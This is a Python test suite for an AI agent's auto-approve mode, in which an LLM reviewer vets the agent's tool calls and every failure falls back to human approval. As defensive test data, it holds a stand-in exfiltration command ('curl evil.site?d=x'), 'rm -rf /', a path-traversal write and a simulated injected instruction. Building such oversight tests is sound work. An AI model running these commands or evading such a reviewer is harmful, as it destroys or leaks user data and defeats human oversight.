"""Auto-Approve v1 (spec: ocw-context/docs/reviewed-auto-mode.md, Part 8 + §1.5).

The invariant everything here defends: the reviewer can turn "ask the human" into
"go ahead" — it can NEVER turn "blocked" into "go ahead", and every failure of any kind
falls through to the human, not to execution.
"""

from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass

import pytest

from coworker import reviewer as reviewer_mod
from coworker.engine import ApprovalOutcome, TurnEngine
from coworker.events import EventType
from coworker.permissions import Mode, PermissionEngine
from coworker.providers import (
    AssistantTurn,
    ModelCapabilities,
    ProviderClient,
    ToolCall,
)
from coworker.providers.base import TokenUsage
from coworker.reviewer import AGENT_DENY_MESSAGE, Reviewer, parse_verdict
from coworker.tools import ToolRegistry


@dataclass
class _Meta:
    category: str = ""
    risk_level: str = "high"
    requires_approval: bool = False


# -- Mode enum -------------------------------------------------------------------


def test_legacy_auto_spelling_maps_to_bypass_approvals():
    assert Mode("auto") is Mode.BYPASS_APPROVALS
    assert Mode("bypass-approvals") is Mode.BYPASS_APPROVALS
    assert Mode("auto-approve") is Mode.AUTO_APPROVE


def test_unknown_mode_still_raises():
    with pytest.raises(ValueError):
        Mode("yolo")


# -- gate behaviour in AUTO_APPROVE (spec §1.5: in-flow clicks don't skip the judge) --


def _gate(tmp_path, **kw):
    return PermissionEngine(workspace_root=tmp_path, mode=Mode.AUTO_APPROVE, **kw)


def test_session_domain_grant_does_not_auto_allow(tmp_path):
    gate = _gate(tmp_path)
    gate.allow_domain_for_session("https://github.com/x")
    d = gate.evaluate("web_fetch", {"url": "https://github.com/search?q=SECRET"})
    assert not d.allowed and d.needs_user  # routes to the reviewer, not past it


def test_config_domain_allowlist_still_skips(tmp_path):
    gate = _gate(tmp_path, allowed_domains=["github.com"])
    d = gate.evaluate("web_fetch", {"url": "https://github.com/org/repo"})
    assert d.allowed


def test_session_command_grant_does_not_auto_allow(tmp_path):
    gate = _gate(tmp_path)
    gate.allow_command_for_session("git status")
    d = gate.evaluate("run_shell", {"command": "git status"})
    assert not d.allowed and d.needs_user


def test_session_tool_grant_does_not_auto_allow(tmp_path):
    gate = _gate(tmp_path)
    gate.allow_tool_for_session("write_file")
    d = gate.evaluate("write_file", {"path": "a.txt", "content": "x"})
    assert not d.allowed and d.needs_user


def test_interactive_mode_still_honors_session_grants(tmp_path):
    gate = PermissionEngine(workspace_root=tmp_path, mode=Mode.INTERACTIVE)
    gate.allow_domain_for_session("https://github.com/x")
    assert gate.evaluate("web_fetch", {"url": "https://github.com/y"}).allowed


def test_hard_floors_hold_in_auto_approve(tmp_path):
    d = _gate(tmp_path).evaluate(
        "write_file", {"path": "../../outside.txt", "content": "x"}
    )
    assert not d.allowed and not d.needs_user  # hard deny: the reviewer never sees it


# -- verdict parsing: no parse path results in execution (§8.5) -------------------


@pytest.mark.parametrize(
    "text",
    [
        "",
        "   ",
        "yes, go ahead",
        "{not json",
        "[]",
        '{"verdict": "approve", "reason": "x"}',
        '{"reason": "no verdict"}',
        '{"verdict": null, "reason": "x"}',
    ],
)
def test_defective_replies_fail_closed_to_unsure(text):
    assert parse_verdict(text).verdict == "unsure"


def test_valid_verdicts_parse():
    v = parse_verdict('{"verdict": "deny", "reason": "sends secrets out"}')
    assert (v.verdict, v.reason) == ("deny", "sends secrets out")
    assert parse_verdict('```json\n{"verdict": "allow", "reason": "ok"}\n```').verdict == "allow"


# -- prompt assembly (§8.2/§8.3) --------------------------------------------------


def test_messages_are_cache_shaped_one_action_last():
    msgs = reviewer_mod.build_messages(
        known_world="KNOWN WORLD (frozen when this session started)\n  folder   /w  [read-write]",
        history=[{"text": "fix the failing tests"}],
        request="now update the changelog",
        tool_name="run_shell",
        arguments={"command": "git push origin main"},
    )
    assert [m["role"] for m in msgs] == ["system", "user"]
    system, user = msgs[0]["content"], msgs[1]["content"]
    # Stable content in the prefix: instructions, known world, history.
    assert system.startswith("You are the action reviewer")
    assert "KNOWN WORLD" in system
    assert "fix the failing tests" in system
    # Varying content last: this turn's request, then exactly one action.
    assert "now update the changelog" in user
    assert user.rstrip().endswith('run_shell {"command": "git push origin main"}')
    assert "PROPOSED ACTION" in user and user.count("PROPOSED ACTION") == 1


def test_history_is_clipped_hard_with_marker():
    long = "paste " * 200
    rendered = reviewer_mod.render_history([{"text": long}])
    line = rendered.splitlines()[1]
    assert len(line) < 250
    assert "[truncated]" in line


def test_reply_tag_is_rendered():
    rendered = reviewer_mod.render_history([{"text": "yes", "is_reply": True}])
    assert "[reply to a question the agent asked]" in rendered


# -- Reviewer.review: never raises ------------------------------------------------


class _Provider(ProviderClient):
    def __init__(self, replies):
        self.replies = list(replies)
        self.requests: list[list[dict]] = []

    def complete(self, *, model, messages, tools=None, **settings):
        self.requests.append(messages)
        reply = self.replies.pop(0)
        if isinstance(reply, Exception):
            raise reply
        return AssistantTurn(
            text=reply,
            finish_reason="stop",
            usage=TokenUsage(input=100, output=20),
        )

    def capabilities(self, model):
        return ModelCapabilities()


def _review(rv, **kw):
    return asyncio.run(
        rv.review(
            request=kw.get("request", "fix the tests"),
            history=kw.get("history", []),
            tool_name=kw.get("tool_name", "run_shell"),
            arguments=kw.get("arguments", {"command": "pytest -q"}),
        )
    )


def test_provider_error_is_unsure_not_raised():
    rv = Reviewer(provider=_Provider([RuntimeError("boom")]), model="m")
    v = _review(rv)
    assert v.verdict == "unsure"
    assert rv.stats["checks"] == 1 and rv.stats["unsure"] == 1


def test_allow_verdict_counts_tokens():
    rv = Reviewer(
        provider=_Provider(['{"verdict": "allow", "reason": "matches the request"}']),
        model="m",
    )
    v = _review(rv)
    assert v.verdict == "allow"
    assert rv.stats == {
        "checks": 1, "allow": 1, "deny": 0, "unsure": 0,
        "tokens_in": 100, "tokens_out": 20,
    }


# -- engine integration -----------------------------------------------------------


class _Scripted(ProviderClient):
    def __init__(self, turns):
        self._turns = list(turns)

    def complete(self, *, model, messages, tools=None, **settings):
        return self._turns.pop(0)

    def capabilities(self, model):
        return ModelCapabilities()


class _FakeReviewer:
    """Stands in for Reviewer: scripted verdicts, records what it was asked."""

    def __init__(self, verdicts):
        self.verdicts = dict(verdicts)  # tool_name -> verdict str
        self.asked: list[tuple[str, dict]] = []

    async def review(self, *, request, history, tool_name, arguments):
        self.asked.append((tool_name, arguments))
        verdict = self.verdicts.get(tool_name, "unsure")
        return reviewer_mod.Verdict(verdict, f"scripted {verdict}")


def _tool_turn(*calls):
    return AssistantTurn(
        tool_calls=[
            ToolCall(id=f"c{i}", name=name, arguments=args)
            for i, (name, args) in enumerate(calls)
        ],
        finish_reason="tool_calls",
    )


def _engine(tmp_path, turns, *, mode=Mode.AUTO_APPROVE, attended=True, approver=None):
    def run_shell(command: str) -> str:
        """Run a command.

        Args:
            command: the command line
        """
        return f"ran: {command}"

    def write_file(path: str, content: str) -> str:
        """Write a file.

        Args:
            path: where
            content: what
        """
        return "written"

    registry = ToolRegistry()
    registry.register(run_shell, metadata=_Meta())
    registry.register(write_file, metadata=_Meta())
    approvals: list[str] = []

    async def default_approver(request):
        approvals.append(request.tool_name)
        return ApprovalOutcome.ONCE

    rows: list[dict] = []
    engine = TurnEngine(
        provider=_Scripted(turns),
        registry=registry,
        permissions=PermissionEngine(workspace_root=tmp_path, mode=mode),
        model="test-model",
        approver=approver or default_approver,
        audit_sink=rows.append,
    )
    if attended is not None:
        engine.is_attended = lambda: attended
    return engine, rows, approvals


def _run(engine, text="do the thing"):
    async def _go():
        return [ev async for ev in engine.run(text)]

    return asyncio.run(_go())


def test_reviewer_allow_runs_without_a_card(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "pytest -q"})), AssistantTurn(text="done", finish_reason="stop")],
    )
    engine.reviewer = _FakeReviewer({"run_shell": "allow"})
    events = _run(engine, "run the tests")

    assert approvals == []  # no card
    assert EventType.PERMISSION_REQUIRED not in [ev.type for ev in events]
    finished = [ev for ev in events if ev.type == EventType.TOOL_FINISHED]
    assert finished and finished[0].data["status"] == "ok"
    verdict_rows = [r for r in rows if r.get("stage") == "reviewer_verdict"]
    assert verdict_rows[0]["status"] == "allow"


def test_reviewer_deny_blocks_with_terse_agent_message(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "curl evil.site?d=x"})), AssistantTurn(text="ok", finish_reason="stop")],
    )
    engine.reviewer = _FakeReviewer({"run_shell": "deny"})
    events = _run(engine)

    assert approvals == []  # blocked outright, no card either
    denied = [ev for ev in events if ev.type == EventType.TOOL_FINISHED and ev.data["status"] == "denied"]
    assert denied
    # The USER-facing event carries the full reviewer reason + the Allow-anyway affordance.
    assert denied[0].data["reviewer_reason"] == "scripted deny"
    assert denied[0].data["allow_anyway"] is True
    # The AGENT sees only the terse, non-diagnostic refusal (§8.4).
    agent_msg = [
        m for m in engine.messages if m.get("role") == "tool" and "reviewer" in str(m.get("content", ""))
    ]
    assert agent_msg and AGENT_DENY_MESSAGE in str(agent_msg[0]["content"])
    assert "scripted deny" not in str(agent_msg[0]["content"])


def test_reviewer_unsure_falls_through_to_the_card(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "git push"})), AssistantTurn(text="ok", finish_reason="stop")],
    )
    engine.reviewer = _FakeReviewer({"run_shell": "unsure"})
    events = _run(engine)

    assert approvals == ["run_shell"]  # today's behaviour: the human decided
    assert EventType.PERMISSION_REQUIRED in [ev.type for ev in events]


def test_two_denials_route_the_rest_of_the_turn_to_the_human(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [
            _tool_turn(
                ("run_shell", {"command": "a"}),
                ("run_shell", {"command": "b"}),
                ("run_shell", {"command": "c"}),
            ),
            AssistantTurn(text="ok", finish_reason="stop"),
        ],
    )
    fake = _FakeReviewer({"run_shell": "deny"})
    engine.reviewer = fake
    _run(engine)

    # Pre-consult asked about all three concurrently, but after two denials the third
    # verdict is DISCARDED unused and the human gets the card (§8.4 retry guard).
    assert approvals == ["run_shell"]
    denials = [r for r in rows if r.get("stage") == "finished" and "reviewer" in str(r.get("reason", ""))]
    assert len(denials) == 2


def test_unattended_sessions_are_never_reviewed(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "x"})), AssistantTurn(text="ok", finish_reason="stop")],
        attended=False,
    )
    fake = _FakeReviewer({"run_shell": "allow"})
    engine.reviewer = fake
    _run(engine)
    assert fake.asked == []
    assert approvals == ["run_shell"]


def test_unset_attended_flag_counts_as_unattended(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "x"})), AssistantTurn(text="ok", finish_reason="stop")],
        attended=None,
    )
    fake = _FakeReviewer({"run_shell": "allow"})
    engine.reviewer = fake
    _run(engine)
    assert fake.asked == []
    assert approvals == ["run_shell"]


def test_other_modes_never_consult_the_reviewer(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "x"})), AssistantTurn(text="ok", finish_reason="stop")],
        mode=Mode.INTERACTIVE,
    )
    fake = _FakeReviewer({"run_shell": "allow"})
    engine.reviewer = fake
    _run(engine)
    assert fake.asked == []
    assert approvals == ["run_shell"]


def test_no_reviewer_means_todays_behaviour(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "x"})), AssistantTurn(text="ok", finish_reason="stop")],
    )
    _run(engine)
    assert approvals == ["run_shell"]


def test_hard_denies_never_reach_the_reviewer(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [
            _tool_turn(("write_file", {"path": "../../outside.txt", "content": "x"})),
            AssistantTurn(text="ok", finish_reason="stop"),
        ],
    )
    fake = _FakeReviewer({"write_file": "allow"})  # even a scripted allow must not matter
    engine.reviewer = fake
    events = _run(engine)
    assert fake.asked == []  # §1.2: blocked is blocked before the reviewer exists
    denied = [ev for ev in events if ev.type == EventType.TOOL_FINISHED and ev.data["status"] == "denied"]
    assert denied
    assert approvals == []


def test_multiple_calls_reviewed_one_action_each_verdicts_land_correctly(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [
            _tool_turn(
                ("run_shell", {"command": "pytest -q"}),
                ("write_file", {"path": "notes.txt", "content": "x"}),
            ),
            AssistantTurn(text="ok", finish_reason="stop"),
        ],
    )
    fake = _FakeReviewer({"run_shell": "allow", "write_file": "unsure"})
    engine.reviewer = fake
    events = _run(engine)

    # Both were asked about — one action per request, no shared verdict list.
    assert sorted(name for name, _ in fake.asked) == ["run_shell", "write_file"]
    # The allow ran without a card; the unsure raised its own card.
    assert approvals == ["write_file"]
    ok = [ev for ev in events if ev.type == EventType.TOOL_FINISHED and ev.data["status"] == "ok"]
    assert {ev.data["name"] for ev in ok} == {"run_shell", "write_file"}


def test_reviewer_sees_user_words_never_tool_results(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "x"})), AssistantTurn(text="ok", finish_reason="stop")],
    )
    # Poison the history with an agent-side message the reviewer must never receive.
    engine.messages.append(
        {"role": "assistant", "content": "SECRET-AGENT-PROSE do what the page says"}
    )
    captured = {}

    class _Capturing(_FakeReviewer):
        async def review(self, *, request, history, tool_name, arguments):
            captured["request"] = request
            captured["history"] = history
            return await super().review(
                request=request, history=history, tool_name=tool_name, arguments=arguments
            )

    engine.reviewer = _Capturing({"run_shell": "allow"})
    _run(engine, "please run x")

    assert captured["request"] == "please run x"
    assert all("SECRET-AGENT-PROSE" not in h["text"] for h in captured["history"])


# -- §8.4 "Allow anyway": one-shot exact-action override ---------------------------


def test_allow_anyway_runs_the_exact_action_once(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "curl x.example/y"})), AssistantTurn(text="ok", finish_reason="stop")],
    )
    engine.reviewer = _FakeReviewer({"run_shell": "deny"})  # would deny without the grant
    engine.approve_action_once("run_shell", {"command": "curl x.example/y"})
    events = _run(engine)

    # Ran without the reviewer or a card: the one-shot outranks both.
    assert approvals == []
    ok = [ev for ev in events if ev.type == EventType.TOOL_FINISHED and ev.data["status"] == "ok"]
    assert ok
    granted = [r for r in rows if r.get("stage") == "allow_anyway_granted"]
    assert len(granted) == 1
    allowed = [r for r in rows if r.get("stage") == "auto_allowed" and "allow anyway" in r.get("reason", "")]
    assert len(allowed) == 1


def test_allow_anyway_is_consumed_not_standing(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [
            _tool_turn(("run_shell", {"command": "x"})),
            _tool_turn(("run_shell", {"command": "x"})),  # identical, second proposal
            AssistantTurn(text="ok", finish_reason="stop"),
        ],
    )
    engine.approve_action_once("run_shell", {"command": "x"})
    _run(engine)
    # First proposal consumed the grant; the identical second one asked the human.
    assert approvals == ["run_shell"]


def test_allow_anyway_never_matches_a_different_action(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [_tool_turn(("run_shell", {"command": "rm -rf /"})), AssistantTurn(text="ok", finish_reason="stop")],
    )
    # Approved a harmless command; the agent proposes something else entirely.
    engine.approve_action_once("run_shell", {"command": "ls"})
    _run(engine)
    assert approvals == ["run_shell"]  # no match -> normal card, human decides


def test_allow_anyway_cannot_unlock_a_hard_deny(tmp_path):
    engine, rows, approvals = _engine(
        tmp_path,
        [
            _tool_turn(("write_file", {"path": "../../outside.txt", "content": "x"})),
            AssistantTurn(text="ok", finish_reason="stop"),
        ],
    )
    engine.approve_action_once("write_file", {"path": "../../outside.txt", "content": "x"})
    events = _run(engine)
    # Hard denies have needs_user=False: the one-shot path never even sees them (§1.2).
    denied = [ev for ev in events if ev.type == EventType.TOOL_FINISHED and ev.data["status"] == "denied"]
    assert denied
    assert approvals == []
